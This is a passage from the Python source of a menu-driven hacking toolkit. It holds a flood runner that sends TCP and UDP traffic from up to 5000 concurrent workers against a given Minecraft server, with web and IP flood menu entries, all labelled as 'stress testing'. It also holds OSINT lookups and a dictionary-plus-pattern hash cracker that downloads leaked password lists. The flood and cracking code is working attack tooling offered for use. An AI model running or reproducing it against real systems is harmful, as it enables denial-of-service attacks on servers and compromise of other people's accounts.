            print(f"  {YELLOW}mc_bots.js not found. Running raw TCP bots in background...{RESET}")
            def _run_bots():
                br = {}
                with ThreadPoolExecutor(max_workers=bc) as ex:
                    fs = {ex.submit(_mc_bot_worker, ip, port, br, i): i for i in range(bc)}
                    for f in as_completed(fs):
                        try:
                            f.result()
                        except Exception:
                            pass
            t = threading.Thread(target=_run_bots, daemon=True)
            t.start()

    if flood_enabled:
        udp_port = 19132

        def _run_flood(worker_func, workers, label, use_port, mode="rapid"):
            _start = time.time()
            _sent = [0]
            _errs = [0]
            br = {}
            actual_workers = min(workers, 5000)
            if workers > 5000:
                print(f"  {YELLOW}Capping concurrent connections to 5000 (OS limit). Your input: {workers}{RESET}")

            def _show_progress(elapsed, total_s, total_e):
                rate = total_s / elapsed if elapsed > 0 else 0
                bar_len = 30
                pct = min(elapsed / dur, 1.0) if dur > 0 else 1
                filled = int(bar_len * pct)
                bar = f"{GREEN}{'█' * filled}{DIM}{'░' * (bar_len - filled)}{RESET}"
                sys.stdout.write(f"\r  {CYAN}{label}{RESET} [{bar}] "
                                 f"{GREEN}S:{total_s:,}{RESET} "
                                 f"{RED}E:{total_e:,}{RESET} "
                                 f"{MAGENTA}{rate:,.0f}/s{RESET} "
                                 f"{YELLOW}{elapsed:.0f}s/{dur}s{RESET}  "
                                 f"{DIM}Ctrl+C stop{RESET}{' ' * 20}")
                sys.stdout.flush()

            _last_progress = 0
            ex = ThreadPoolExecutor(max_workers=actual_workers)
            fs = {ex.submit(worker_func, ip, use_port, dur, br, i, mode): i for i in range(actual_workers)}
            try:
                for f in as_completed(fs):
                    try:
                        r = f.result()
                        if isinstance(r, tuple) and len(r) == 2:
                            _sent[0] += r[0]
                            _errs[0] += r[1]
                    except Exception:
                        pass
                    elapsed = time.time() - _start
                    if elapsed - _last_progress >= 0.3:
                        total_s = sum(v[0] for v in br.values() if isinstance(v, tuple) and len(v) == 2)
                        total_e = sum(v[1] for v in br.values() if isinstance(v, tuple) and len(v) == 2)
                        _show_progress(elapsed, total_s, total_e)
                        _last_progress = elapsed
            except KeyboardInterrupt:
                ex.shutdown(wait=False, cancel_futures=True)
                print()
                raise
            finally:
                ex.shutdown(wait=False, cancel_futures=True)

            el = time.time() - _start
            total_s = sum(v[0] for v in br.values() if isinstance(v, tuple) and len(v) == 2)
            total_e = sum(v[1] for v in br.values() if isinstance(v, tuple) and len(v) == 2)
            _show_progress(el, total_s, total_e)
            rat = total_s / el if el > 0 else 0
            print(f"\n  {GREEN}{SYM_CHECK} {label}: {c(f'S:{total_s:,}', GREEN)} {c(f'E:{total_e:,}', RED)} in {c(f'{el:.1f}s', CYAN)} ({c(f'{rat:,.0f}/s', MAGENTA)}){RESET}")
            return total_s

        total = 0
        try:
            if ft in ("r", "s"):
                mode = "rapid" if ft == "r" else "sustained"
                total += _run_flood(mc_tcp_flood_worker, cc, "TCP flood", port, mode)
            elif ft == "u":
                total += _run_flood(mc_udp_flood_worker, cc, "UDP flood", udp_port)
            elif ft == "b":
                total += _run_flood(mc_tcp_flood_worker, cc, "TCP flood", port, "rapid")
                total += _run_flood(mc_udp_flood_worker, cc, "UDP flood", udp_port)
            print(f"  {c(SYM_CHECK + f' Total: {total:,} packets sent', GREEN)}")
        except KeyboardInterrupt:
            print(f"\n  {YELLOW}Flood stopped by user.{RESET}")
    else:
        print(f"  {c('Bot attack running in background. Press Ctrl+C to stop.', YELLOW)}")
        try:
            while True:
                if bot_proc and bot_proc.poll() is not None:
                    print(f"\n  {c('Bots finished.', GREEN)}")
                    break
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n  {YELLOW}Stopped.{RESET}")
            if bot_proc:
                try:
                    bot_proc.terminate()
                except Exception:
                    pass

    print()


def menu_stress():
    _menu_loop("stress", "Stress Testing", [
        ("1", "Minecraft Stress Test", stress_minecraft),
        ("2", "Web Stress Test", stress_http),
        ("3", "IP Flood Test", stress_ip),
        ("b", "Back to main menu", None),
    ], RED)


# ══════════════════════════════════════════════════════
#  MODULE 8: OSINT
# ══════════════════════════════════════════════════════

COUNTRY_CODES = {
    "1": "US/CA", "7": "RU", "20": "EG", "27": "ZA", "30": "GR", "31": "NL",
    "32": "BE", "33": "FR", "34": "ES", "36": "HU", "39": "IT", "40": "RO",
    "41": "CH", "43": "AT", "44": "UK", "45": "DK", "46": "SE", "47": "NO",
    "48": "PL", "49": "DE", "51": "PE", "52": "MX", "53": "CU", "54": "AR",
    "55": "BR", "56": "CL", "57": "CO", "58": "VE", "60": "MY", "61": "AU",
    "62": "ID", "63": "PH", "64": "NZ", "65": "SG", "66": "TH", "81": "JP",
    "82": "KR", "84": "VN", "86": "CN", "90": "TR", "91": "IN", "92": "PK",
    "93": "AF", "94": "LK", "95": "MM", "98": "IR", "212": "MA", "213": "DZ",
    "216": "TN", "220": "GM", "234": "NG", "254": "KE", "255": "TZ", "256": "UG",
    "263": "ZW", "351": "PT", "352": "LU", "353": "IE", "354": "IS", "355": "AL",
    "356": "MT", "357": "CY", "358": "FI", "359": "BG", "370": "LT", "371": "LV",
    "372": "EE", "373": "MD", "374": "AM", "375": "BY", "376": "AD", "377": "MC",
    "378": "SM", "380": "UA", "381": "RS", "385": "HR", "386": "SI", "387": "BA",
    "389": "MK", "420": "CZ", "421": "SK", "423": "LI", "502": "GT", "503": "SV",
    "504": "HN", "505": "NI", "506": "CR", "507": "PA", "591": "BO", "592": "GY",
    "593": "EC", "594": "GF", "595": "PY", "596": "MQ", "597": "SR", "598": "UY",
    "880": "BD", "886": "TW", "960": "MV", "961": "LB", "962": "JO", "963": "SY",
    "964": "IQ", "965": "KW", "966": "SA", "967": "YE", "968": "OM", "971": "AE",
    "972": "IL", "973": "BH", "974": "QA", "975": "BT", "976": "MN", "977": "NP",
    "992": "TJ", "993": "TM", "994": "AZ", "995": "GE", "996": "KG", "998": "UZ",
}

SUBDOMAIN_WORDLIST = [
    "www", "mail", "ftp", "webmail", "smtp", "pop", "ns1", "ns2", "vpn", "ssh",
    "test", "dev", "stage", "api", "app", "beta", "admin", "portal", "shop",
    "blog", "forum", "support", "help", "cdn", "static", "img", "images",
    "assets", "media", "video", "download", "downloads", "store", "secure",
    "auth", "login", "member", "members", "my", "m", "mobile", "mob", "owa",
    "remote", "exchange", "owa", "mx", "autodiscover", "cpanel", "webmail",
    "status", "stats", "dashboard", "monitor", "trac", "git", "jenkins",
]


def _detect_operator(ndc):
    first = ndc[:2]
    if first[0] in "6789":
        if first in {"80", "81", "82", "83", "84", "85", "86", "87", "88", "89", "70", "71", "72", "73", "74", "75", "76", "77", "78", "79"}:
            return "Reliance Jio"
        if first in {"98", "99", "96", "97", "90", "91", "92", "93", "94", "95"}:
            return "Airtel"
        if first[0] == "6":
            return "BSNL / Jio (MNP possible)"
        return "Airtel/Jio (MNP possible)"
    return "Unknown"


def osint_phone():
    header_box("Phone Number OSINT", YELLOW)
    num = _get("Phone number (+CC)")
    if not num:
        return
    cleaned = re.sub(r'[^\d+]', '', num)
    if not cleaned.startswith('+'):
        cleaned = '+' + cleaned
    print(f"\n  {c('Analyzing:', CYAN)} {cleaned}")
    for code, country in sorted(COUNTRY_CODES.items(), key=lambda x: -len(x[0])):
        if cleaned.startswith('+' + code):
            print(f"  {c('Country:', GREEN)} {country}")
            ndc = cleaned[len(code)+1:len(code)+4]
            print(f"  {c('Operator:', GREEN)} {_detect_operator(ndc)}")
            break
    else:
        print(f"  {YELLOW}Country not matched.{RESET}")
    print()


def osint_email():
    header_box("Email OSINT", YELLOW)
    email = _get("Email address")
    if not email or "@" not in email:
        print(f"  {RED}Invalid email.{RESET}")
        return
    domain = email.split("@")[-1]
    print(f"\n  {c('Domain:', CYAN)} {domain}")
    try:
        mx = socket.getaddrinfo(domain, 25)
        print(f"  {c('MX reachable:', GREEN)} yes")
    except Exception:
        print(f"  {c('MX reachable:', YELLOW)} no")
    gh = hashlib.md5(email.encode()).hexdigest()
    print(f"  {c('Gravatar:', CYAN)} https://www.gravatar.com/avatar/{gh}")
    print(f"  {c('Pwned check:', CYAN)} https://haveibeenpwned.com/account/{email}")
    print()


def osint_ipgeo():
    header_box("IP Geolocation", YELLOW)
    target = _get("IP or domain")
    if not target:
        return
    try:
        socket.inet_aton(target)
        ip = target
    except OSError:
        try:
            ip = socket.gethostbyname(target)
            print(f"  {c(SYM_CHECK, GREEN)} {target} {SYM_ARROW} {ip}")
        except Exception:
            print(f"  {RED}Could not resolve.{RESET}")
            return
    with spinner(f"Querying geo for {ip}...", YELLOW):
        try:
            r = requests.get(f"https://ipwho.is/{ip}", timeout=10)
            d = r.json()
        except Exception:
            print(f"  {RED}{SYM_X} Lookup failed.{RESET}")
            return
    if d and d.get("success", False):
        print(f"\n  {c('IP:', GREEN)} {d.get('ip')}")
        print(f"  {c('Location:', GREEN)} {d.get('city', '?')}, {d.get('region', '?')}, {d.get('country', '?')}")
        print(f"  {c('ISP:', GREEN)} {(d.get('connection') or {}).get('isp', '?')}")
        asn = (d.get('connection') or {}).get('asn')
        print(f"  {c('ASN:', GREEN)} AS{asn}" if asn else "")
        tz = (d.get('timezone') or {}).get('id', '?')
        print(f"  {c('TZ:', GREEN)} {tz}")
        print(f"  {c('Map:', CYAN)} https://www.google.com/maps?q={d.get('latitude',0)},{d.get('longitude',0)}")
    else:
        print(f"  {RED}{SYM_X} Lookup failed.{RESET}")
    print()


def osint_dns():
    header_box("DNS Enumeration", YELLOW)
    domain = _get("Domain")
    if not domain:
        return
    domain = domain.lower().strip(".")
    with spinner(f"Enumerating DNS for {domain}...", YELLOW):
        results = {}
        for rtype in ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA"]:
            if _which("dig"):
                r = _run(["dig", "+short", domain, rtype], timeout=5)
                if r and r.stdout.strip():
                    results[rtype] = [l.strip() for l in r.stdout.strip().splitlines() if l.strip()][:4]
            else:
                if rtype == "A":
                    try:
                        results[rtype] = [socket.gethostbyname(domain)]
                    except Exception:
                        pass
    print(f"\n  {c('Records:', CYAN)}")
    for rtype, vals in results.items():
        print(f"  {c(f'{rtype:6s}:', GREEN)} {c(', '.join(vals), CYAN)}")
    if not results:
        print(f"  {YELLOW}No records found.{RESET}")
    print()


def osint_subdomain():
    header_box("Subdomain Discovery", YELLOW)
    domain = _get("Domain")
    if not domain:
        return
    domain = domain.lower().strip(".")
    print(f"  {c(f'Brute-forcing {len(SUBDOMAIN_WORDLIST)} names (rate-limited)...', CYAN)}")
    found = []
    total = len(SUBDOMAIN_WORDLIST)
    for i, sub in enumerate(SUBDOMAIN_WORDLIST):
        fqdn = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(fqdn)
            found.append((fqdn, ip))
            print(f"  {c(SYM_CHECK, GREEN)} {c(fqdn, CYAN)} {SYM_ARROW} {c(ip, GREEN)}")
        except Exception:
            pass
        if i % 10 == 0:
            sys.stdout.write(f"\r  {c(f'{i}/{total}', CYAN)} Found: {c(len(found), GREEN)}  ")
            sys.stdout.flush()
        if i % 4 == 0:
            time.sleep(0.2)
    print(f"\n  {c(f'Found {len(found)} subdomains', GREEN)}\n")


def osint_website():
    header_box("Website Tech Recon", YELLOW)
    url = _get("URL")
    if not url:
        return
    if not url.startswith("http"):
        url = "https://" + url
    r = _http_get(url, timeout=10)
    if not r:
        print(f"  {RED}{SYM_X} Request failed.{RESET}")
        return
    print(f"\n  {c('Status:', GREEN)} {r.status_code}")
    print(f"  {c('Final URL:', GREEN)} {r.url}")
    print(f"  {c('Size:', GREEN)} {len(r.content):,} bytes")
    for h in ["Server", "X-Powered-By", "X-Frame-Options", "Content-Security-Policy", "Strict-Transport-Security"]:
        if h in r.headers:
            print(f"  {c(f'{h}:', GREEN)} {r.headers[h][:60]}")
    print()


def osint_whois():
    header_box("Whois Lookup", YELLOW)
    domain = _get("Domain")
    if not domain:
        return
    if not _which("whois"):
        print(f"  {YELLOW}whois not installed.{RESET}")
        return
    r = _run(["whois", domain], timeout=30)
    if not r:
        print(f"  {RED}{SYM_X} Whois failed.{RESET}")
        return
    for line in r.stdout.splitlines():
        if any(line.lower().startswith(k) for k in ["domain name", "registrar", "creation date", "expir", "registrant", "name server", "dnssec", "status"]):
            print(f"  {c(line.strip()[:90], GREEN)}")
    print()


def menu_osint():
    _menu_loop("osint", "OSINT Reconnaissance", [
        ("1", "Phone Lookup", osint_phone),
        ("2", "Email OSINT", osint_email),
        ("3", "IP Geolocation", osint_ipgeo),
        ("4", "DNS Enumeration", osint_dns),
        ("5", "Subdomain Discovery", osint_subdomain),
        ("6", "Website Tech Recon", osint_website),
        ("7", "Whois Lookup", osint_whois),
        ("b", "Back to main menu", None),
    ], YELLOW)


# ══════════════════════════════════════════════════════
#  MODULE 9: TELEPHONE
# ══════════════════════════════════════════════════════

def tel_analyze():
    header_box("Telephone Number Analysis", MAGENTA)
    num = _get("Phone number")
    if not num:
        return
    cleaned = re.sub(r'[^\d+]', '', num)
    if not cleaned.startswith('+'):
        cleaned = '+' + cleaned
    print(f"\n  {c('Number:', GREEN)} {cleaned}")
    for code, country in sorted(COUNTRY_CODES.items(), key=lambda x: -len(x[0])):
        if cleaned.startswith('+' + code):
            print(f"  {c('Country:', GREEN)} {country}")
            break
    print()


def tel_format():
    header_box("Format Phone Number", MAGENTA)
    num = _get("Phone number")
    if not num:
        return
    digits = re.sub(r'\D', '', num)
    print(f"\n  {c('Digits:', GREEN)} {digits}")
    if len(digits) == 10 and digits[0] in "6789":
        print(f"  {c('IN format:', GREEN)} +91 {digits[0:5]} {digits[5:]}")
    elif len(digits) >= 11:
        print(f"  {c('Intl:', GREEN)} +{digits[0:len(digits)-10]} {digits[-10:-5]} {digits[-5:]}")
    print()


def menu_telephone():
    _menu_loop("telephone", "Telephone Tools", [
        ("1", "Analyze Number", tel_analyze),
        ("2", "Format Number", tel_format),
        ("3", "Country Codes", lambda: [print(f"  {c(f'+{c}', GREEN):8s} {country}") for c, country in sorted(COUNTRY_CODES.items(), key=lambda x: int(x[0]))]),
        ("b", "Back to main menu", None),
    ], MAGENTA)


# ══════════════════════════════════════════════════════
#  MODULE 10: NETWORK UTILITIES
# ══════════════════════════════════════════════════════

def legacy_portscan():
    vuln_advanced_scan()


def legacy_sslcheck():
    header_box("SSL/TLS Checker", BLUE)
    host = _get("Host")
    if not host:
        return
    port = _get_int("Port", 443)
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((host, port), timeout=8) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ss:
                cert = ss.getpeercert()
                print(f"\n  {c('Cipher:', GREEN)} {ss.cipher()[0]}")
                print(f"  {c('Version:', GREEN)} {ss.version()}")
                if cert:
                    print(f"  {c('Issuer:', GREEN)} {dict(x[0] for x in cert['issuer']).get('commonName', '?')}")
                    print(f"  {c('Subject:', GREEN)} {dict(x[0] for x in cert['subject']).get('commonName', '?')}")
                    print(f"  {c('Expires:', GREEN)} {cert['notAfter']}")
    except Exception as e:
        print(f"  {RED}{SYM_X} {e}{RESET}")
    print()


def legacy_httpheaders():
    header_box("HTTP Security Headers", BLUE)
    url = _get("URL")
    if not url:
        return
    if not url.startswith("http"):
        url = "https://" + url
    r = _http_get(url, timeout=10)
    if not r:
        print(f"  {RED}{SYM_X} Request failed.{RESET}")
        return
    checks = [
        ("Strict-Transport-Security", True),
        ("Content-Security-Policy", True),
        ("X-Frame-Options", True),
        ("X-Content-Type-Options", True),
        ("Referrer-Policy", True),
        ("Permissions-Policy", True),
    ]
    print(f"\n  {c('Header check for', CYAN)} {url}")
    for header, _ in checks:
        present = header in r.headers
        print(f"  {c(SYM_CHECK if present else SYM_X, GREEN if present else RED)} {header}")
        if not present:
            add_log_alert("WARN", "Headers", f"{url}: missing {header}")
    print()


def legacy_ping():
    header_box("Ping", BLUE)
    host = _get("Host")
    if not host:
        return
    n = _get_int("Packets", 4)
    system = platform.system().lower()
    cmd = ["ping", "-n", str(n), host] if system == "windows" else ["ping", "-c", str(n), host]
    r = _run(cmd, timeout=20)
    if r:
        for line in r.stdout.splitlines():
            print(f"  {c(line.strip()[:90], GREEN)}")
    print()


def legacy_traceroute():
    header_box("Traceroute", BLUE)
    host = _get("Host")
    if not host:
        return
    system = platform.system().lower()
    cmd = ["tracert", host] if system == "windows" else ["traceroute", host]
    print(f"  {c('Running... (may take a while)', CYAN)}")
    r = _run(cmd, timeout=60)
    if r:
        for line in r.stdout.splitlines():
            print(f"  {c(line.strip()[:90], GREEN)}")
    print()


def menu_netutils():
    _menu_loop("netutils", "Network Utilities", [
        ("1", "Port Scanner", legacy_portscan),
        ("2", "SSL/TLS Checker", legacy_sslcheck),
        ("3", "HTTP Security Headers", legacy_httpheaders),
        ("4", "Ping", legacy_ping),
        ("5", "Traceroute", legacy_traceroute),
        ("b", "Back to main menu", None),
    ], BLUE)


# ══════════════════════════════════════════════════════
#  MODULE 11: HASH & CRYPTO
# ══════════════════════════════════════════════════════

def hash_generator():
    header_box("Hash Generator", CYAN)
    text = _get("Input text")
    if not text:
        return
    algo = _get("Algorithm (md5/sha1/sha256/sha512/all)", "all").lower()
    algos = ["md5", "sha1", "sha256", "sha384", "sha512"] if algo == "all" else [algo]
    print(f"\n  {c('Hashes:', CYAN)}")
    for a in algos:
        try:
            h = hashlib.new(a)
            h.update(text.encode())
            print(f"  {c(f'{a.upper():8s}', GREEN)} {c(h.hexdigest(), YELLOW)}")
        except ValueError:
            print(f"  {c(f'{a.upper():8s}', RED)} Unknown")
    print()


def hash_identifier():
    header_box("Hash Identifier", CYAN)
    h = _get("Hash")
    if not h:
        return
    length = len(h)
    print(f"  Length: {c(str(length), GREEN)} chars")
    is_hex = bool(re.match(r'^[0-9a-fA-F]+$', h))
    candidates = []
    if length == 32 and is_hex: candidates.append("MD5")
    elif length == 40 and is_hex: candidates.append("SHA-1")
    elif length == 64 and is_hex: candidates.append("SHA-256")
    elif length == 56 and is_hex: candidates.append("SHA-224")
    elif length == 96 and is_hex: candidates.append("SHA-384")
    elif length == 128 and is_hex: candidates.append("SHA-512")
    elif length == 34 and h.startswith("$2"): candidates.append("bcrypt")
    if candidates:
        print(f"  {c('Likely types:', CYAN)} {', '.join(c(cand, GREEN) for cand in candidates)}")
    else:
        print(f"  {YELLOW}Could not determine type.{RESET}")
    print()


# ══════════════════════════════════════════════════════
#  WORDLISTS (real leaked / dictionary DBs for legit testing)
# ══════════════════════════════════════════════════════

WORDLIST_DIR = os.path.join(os.path.expanduser("~/.darkie-tools"), "wordlists")

# Real-world leaked / corpus wordlists (legal to download, use only on systems
# you own / have permission to test).  rockyou.txt is the famous 14M-entry leak.
WORDLIST_SOURCES = {
    "rockyou (14M leaked)": "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt",
    "top-1M probable": "https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/Top1Thousand-probable-v2.txt",
    "SecLists common": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt",
    "SecLists realistic": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Realistic-Passwords/Realistic-Passwords-3.txt",
}


def _system_wordlists():
    """Return every big wordlist file we can find on the system + our dir."""
    bundled = os.path.join(os.path.dirname(os.path.abspath(__file__)), "wordlists")
    candidates = [
        os.path.join(WORDLIST_DIR, "rockyou.txt"),
        os.path.join(WORDLIST_DIR, "rockyou.txt.gz"),
        os.path.join(WORDLIST_DIR, "wordlist.txt"),
        os.path.join(bundled, "rockyou.txt"),
        os.path.join(bundled, "rockyou.txt.gz"),
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/wordlists/rockyou.txt.gz",
        "/usr/share/wordlists/fasttrack.txt",
        "/usr/share/wordlists/nmap.lst",
        "/usr/share/john/password.lst",
    ]
    return [p for p in candidates if os.path.exists(p)]


def _prepare_rockyou():
    """Extract a rockyou.txt.gz (bundled or system) into our wordlist dir."""
    out = os.path.join(WORDLIST_DIR, "rockyou.txt")
    if os.path.exists(out):
        return out
    bundled = os.path.join(os.path.dirname(os.path.abspath(__file__)), "wordlists", "rockyou.txt.gz")
    gz = bundled if os.path.exists(bundled) else os.path.join(WORDLIST_DIR, "rockyou.txt.gz")
    if not os.path.exists(gz):
        gz = "/usr/share/wordlists/rockyou.txt.gz"
    if os.path.exists(gz):
        print(f"  {c('Found compressed rockyou.txt.gz — extracting (14M passwords)...', CYAN)}")
        try:
            import gzip
            with gzip.open(gz, "rb") as fin, open(out, "wb") as fout:
                while True:
                    chunk = fin.read(1 << 20)
                    if not chunk:
                        break
                    fout.write(chunk)
            return out
        except Exception as e:
            print(f"  {RED}{SYM_X} Could not extract: {e}{RESET}")
    return None


def _pick_wordlist():
    """Let the user choose a wordlist (auto-decompress rockyou if present)."""
    os.makedirs(WORDLIST_DIR, exist_ok=True)
    _prepare_rockyou()
    found = _system_wordlists()
    if not found:
        print(f"  {YELLOW}No wordlists found. Use the Wordlist Manager to download one.{RESET}")
        return None
    print(f"\n  {c('Available wordlists:', GREEN)}")
    for i, p in enumerate(found, start=1):
        size = os.path.getsize(p)
        if size > 0:
            from math import log10
            mb = size / (1024 * 1024)
            print(f"  {c(f'[{i}]', CYAN)}  {p}  {DIM}({mb:.1f} MB){RESET}")
    ch = input(f"\n  {c(f'Pick wordlist (1-{len(found)}, Enter=best) {SYM_PROMPT} ', CYAN)}").strip()
    if ch.isdigit() and 1 <= int(ch) <= len(found):
        return found[int(ch) - 1]
    # Default to the biggest (best coverage) = rockyou if present, else first
    return max(found, key=os.path.getsize)


def download_wordlist():
    """Download a real leaked/realistic wordlist into ~/.darkie-tools/wordlists."""
    header_box("Wordlist Manager — Download", CYAN)
    os.makedirs(WORDLIST_DIR, exist_ok=True)
    print(f"\n  {c('Pick a wordlist to download (real leaked/realistic passwords):', GREEN)}")
    names = list(WORDLIST_SOURCES)
    for i, n in enumerate(names, start=1):
        print(f"  {c(f'[{i}]', CYAN)}  {n}")
    ch = input(f"\n  {c(f'Choice (1-{len(names)}) {SYM_PROMPT} ', CYAN)}").strip()
    if not ch.isdigit() or not (1 <= int(ch) <= len(names)):
        return
    name = names[int(ch) - 1]
    url = WORDLIST_SOURCES[name]
    fname = name.split(" ")[0] + ".txt"
    out = os.path.join(WORDLIST_DIR, fname.replace("(", "").replace(")", ""))
    print(f"  {c(f'Downloading {name} ...', CYAN)}")
    try:
        r = requests.get(url, stream=True, timeout=120)
        r.raise_for_status()
        total = int(r.headers.get("Content-Length", 0))
        done = 0
        with open(out, "wb") as f:
            for chunk in r.iter_content(chunk_size=1 << 16):
                f.write(chunk)
                done += len(chunk)
                if total and done % (1 << 20) == 0:
                    print(f"  {c(f'  {done//(1<<20)} MB...', DIM)}", end="\r")
        print(f"\n  {GREEN}{SYM_CHECK} Saved to {c(out, CYAN)} ({os.path.getsize(out)//(1024*1024)} MB){RESET}")
        add_log_alert("INFO", "Wordlists", f"Downloaded {name}")
    except Exception as e:
        print(f"  {RED}{SYM_X} Download failed: {e}{RESET}")
    print()


# ── Smart password guessing: numbers + names + years + symbols ──────────────
_SMART_BASES = ["krish", "admin", "root", "password", "user", "test", "login", "kali",
                "darkie", "dragon", "monkey", "shadow", "master", "welcome", "iloveyou"]
_SMART_SUFFIX = ["1", "12", "123", "1234", "12345", "123456", "0", "00", "000",
                 "1!", "12!", "123!", "1234!", "12345!", "@", "!", "#", "007", "69", "2024", "2025", "2026", "90", "0101"]
_SMART_PREFIX = ["1", "12", "123", "1234", "12345", "123456", "0", "00", "007", "@", "!", "#", "20", "2024", "2025", "2026"]


def _smart_guess_words(seed):
    """Generate name+number / number+name / leet combos from a seed name."""
    seen, out = set(), []
    bases = [seed] + _SMART_BASES if seed else _SMART_BASES
    for b in bases:
        b = b.strip().lower()
        if not b:
            continue
        for w in [b, b.capitalize(), b.upper()]:
            if w not in seen:
                seen.add(w); out.append(w)
        for s in _SMART_SUFFIX:
            w = b + s
            if w not in seen:
                seen.add(w); out.append(w)
            w2 = b.capitalize() + s
            if w2 not in seen:
                seen.add(w2); out.append(w2)
        for p in _SMART_PREFIX:
            w = p + b
            if w not in seen:
                seen.add(w); out.append(w)
        # leet
        leet = b.replace("a", "4").replace("e", "3").replace("i", "1").replace("o", "0").replace("s", "5")
        if leet not in seen:
            seen.add(leet); out.append(leet)
            for s in _SMART_SUFFIX[:12]:
                w = leet + s
                if w not in seen:
                    seen.add(w); out.append(w)
    return out


def hash_cracker():
    header_box("Hash Cracker (Dictionary + Smart Guess)", CYAN)
    target = _get("Hash to crack")
    if not target:
        return
    algo = _get("Algorithm (md5/sha1/sha224/sha256/sha384/sha512/bcrypt)", "md5").lower().strip()
    # Auto-detect bcrypt: any $2a/$2b/$2y/$2x hash MUST use bcrypt (never md5 default)
    if target.startswith("$2"):
        algo = "bcrypt"
        print(f"  {c('Detected bcrypt hash ($2...).', CYAN)}")
    supported = ("md5", "sha1", "sha224", "sha256", "sha384", "sha512", "bcrypt")
    if algo not in supported:
        print(f"  {RED}{SYM_X} Invalid algorithm (supported: {', '.join(supported)}).{RESET}")
        return
    # Import bcrypt lazily only when needed (keeps startup fast)
    if algo == "bcrypt":
        try:
            import bcrypt as _bcrypt
        except ImportError:
            print(f"  {RED}{SYM_X} Need 'bcrypt' module. Install: pip install bcrypt{RESET}")
            return
        if not target.startswith("$2"):
            print(f"  {RED}{SYM_X} A bcrypt hash must start with $2b$/$2y$/$2a$/{RESET}")
            return
    print(f"  {DIM}Wordlists to try: big leaked DB + smart guess (name+number combos).{RESET}")
    seed = _get("A name to guess from (e.g. your nickname)", "").strip()

    # 1) Big dictionary wordlist (auto-pick biggest available / decompress rockyou)
    wl = _pick_wordlist()
    words_done = 0
    found = False
    start = time.time()

    def _check(word):
        nonlocal words_done, found
        words_done += 1
        try:
            if algo == "bcrypt":
                # bcrypt is salted+randomized — must use checkpw, never compare hashes
                if _bcrypt.checkpw(word.encode(), target.encode()):
                    print(f"\n  {RED}{SYM_WARN} CRACKED: {c(word, RED)} (bcrypt){RESET}")
                    add_log_alert("HIGH", "HashCrack", f"Cracked bcrypt: {word}")
                    found = True
                    return True
            else:
                h = hashlib.new(algo)
                h.update(word.encode())
                if h.hexdigest().lower() == target.lower():
                    print(f"\n  {RED}{SYM_WARN} CRACKED: {c(word, RED)} ({algo}){RESET}")
                    add_log_alert("HIGH", "HashCrack", f"Cracked {algo}: {word}")
                    found = True
                    return True
        except Exception:
            pass
        return False

    # Fast path: verify the hash format first (bcrypt handled separately)
    if algo != "bcrypt":
        try:
            hashlib.new(algo).update(b"test")
        except ValueError:
            print(f"  {RED}{SYM_X} Invalid algorithm.{RESET}")
            return

    if wl:
        print(f"  {c(f'Cracking against {os.path.basename(wl)} ...', CYAN)}")
        try:
            with open(wl, "r", encoding="latin-1", errors="ignore") as f:
                for line in f:
                    w = line.strip()
                    if w and _check(w):
                        break
                    if words_done % 200000 == 0 and not found:
                        el = max(1, int(time.time() - start))
                        print(f"  {DIM}{words_done:,} tried ({el}s) — still working...{RESET}", end="\r")
            print()
        except Exception as e:
            print(f"  {RED}{SYM_X} Error reading wordlist: {e}{RESET}")
    else:
        print(f"  {YELLOW}No wordlist file — trying smart guess only.{RESET}")

    # 2) Smart guess (name + numbers + years) — catches things like "1234krish"
    if not found:
        print(f"  {c('Trying smart guess patterns (name + numbers)...', MAGENTA)}")
        for w in _smart_guess_words(seed):
            if _check(w):
                break

    print()
    if not found:
        print(f"  {GREEN}{SYM_CHECK} Not cracked. Try: a bigger wordlist, a rule-based tool (hashcat/john), or a different algorithm.{RESET}")
    else:
        print(f"  {c(f'Cracked in {int(time.time()-start)}s after {words_done:,} guesses.', DIM)}")
    print()


def encoder_decoder():
    header_box("Encoder / Decoder", CYAN)
    print(f"\n  {c('[1]', GREEN)}  Base64 Encode   {c('[2]', GREEN)}  Base64 Decode")
    print(f"  {c('[3]', GREEN)}  URL Encode      {c('[4]', GREEN)}  URL Decode")
    print(f"  {c('[5]', GREEN)}  Hex Encode      {c('[6]', GREEN)}  Hex Decode")
    print(f"  {c('[7]', GREEN)}  ROT13           {c('[8]', GREEN)}  ROT47")
    print(f"  {c('[9]', GREEN)}  Binary Encode   {c('[10]', GREEN)} Binary Decode")
    ch = input(f"\n  {c(f'Choice {SYM_PROMPT} ', CYAN)}").strip()
    text = input(f"  {c(f'Text {SYM_PROMPT} ', CYAN)}").strip()
    if not text or not ch:
        return
    try:
        if ch == "1": result = base64.b64encode(text.encode()).decode()
        elif ch == "2": result = base64.b64decode(text).decode(errors="replace")
        elif ch == "3": result = requests.utils.quote(text)
        elif ch == "4": result = requests.utils.unquote(text)
        elif ch == "5": result = text.encode().hex()
        elif ch == "6": result = bytes.fromhex(text).decode(errors="replace")
        elif ch == "7": result = text.translate(str.maketrans(string.ascii_letters, string.ascii_letters[13:] + string.ascii_letters[:13]))
        elif ch == "8": result = "".join(chr(33+((ord(c)-33+47)%94)) if 33 <= ord(c) <= 126 else c for c in text)
        elif ch == "9": result = " ".join(format(ord(c), '08b') for c in text)
        elif ch == "10": result = "".join(chr(int(b, 2)) for b in text.split())
        else: result = ""
        if result:
            print(f"\n  {c('Result:', GREEN)} {c(result, CYAN)}")
    except Exception as e:
        print(f"  {RED}Error: {e}{RESET}")
    print()


def password_generator():
    header_box("Password Generator", CYAN)
    length = _get_int("Length", 16)
    upper = _yes("Uppercase?", True)
    lower = _yes("Lowercase?", True)
    digits = _yes("Digits?", True)
    sym = _yes("Symbols?", True)
    chars = ""
    if upper: chars += string.ascii_uppercase
    if lower: chars += string.ascii_lowercase
    if digits: chars += string.digits
    if sym: chars += "!@#$%^&*()_+-=[]{}|;:,.<>?"
    if not chars:
        chars = string.ascii_letters + string.digits
    pwd = "".join(random.choice(chars) for _ in range(length))
